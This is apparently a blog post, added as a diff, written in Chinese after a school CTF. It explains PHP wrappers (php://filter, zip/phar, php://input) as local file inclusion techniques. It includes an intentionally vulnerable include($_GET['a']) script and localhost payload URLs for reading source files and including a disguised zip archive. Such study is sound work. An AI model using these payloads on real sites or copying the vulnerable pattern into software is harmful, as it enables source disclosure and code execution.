@@ -1,0 +1,57 @@
+---
+layout:     post
+title:      浅谈php伪协议
+subtitle:   
+date:       2016-11-20
+author:     sp4rk
+header-img: 
+catalog: true
+tags:
+    - php
+---
+
+这次校赛，学长出的一道tomcat提权的题目，需要用伪协议去读文件和getshell，所以记录下常见的几种伪协议及其安全问题。
+
+### 0x01 php://filter
+php://filter是一种元封装器，设计用于数据流打开时的筛选过滤应用，这里可造成LFI
+```php
+<?php   //test.php
+phpinfo();
+?>
+<?php   //1.php
+include($_GET['a']);
+?>
+```
+![](http://cdn.sp4rk.cn/1.png?imageView2/0/q/75|watermark/1/image/aHR0cDovL3d3dy5zcDRyay5jbi81ODQ5Yi93YXRlcm1hcmsucG5n/dissolve/60/gravity/SouthEast/dx/10/dy/10|imageslim)
+```
+http://127.0.0.1/1.php?a=php://filter/read=convert.base64-encode/resource=index.php
+```
+base64 decode一下就是test.php的源码
+allow_url_include:on 可以造成RFI
+### 0x02 zip和phar协议
+
+
+<!--more-->
+
+
+zip(phar)协议造成的文件包含，将test.php压缩为test.zip，再zip改名为jpg格式
+```
+http://127.0.0.1/1.php?a=zip:///var/www/html/test.jpg%23test.php
+```
+成功包含
+![](/Users/sp4rk/Desktop/boke/p.png)
+
+### 0x03 php://input
+php://input可以访问请求的原始数据的只读流,可以接收POST请求的数据，造成文件包含
+```php
+<?php
+$user=$_GET['user'];
+if(file_get_contents($_GET['a'],'r')==='test'){
+	echo phpinfo();
+}
+else{
+	echo "test failed!";
+}
+?>
+```
+![](/Users/sp4rk/Desktop/boke/q.png)
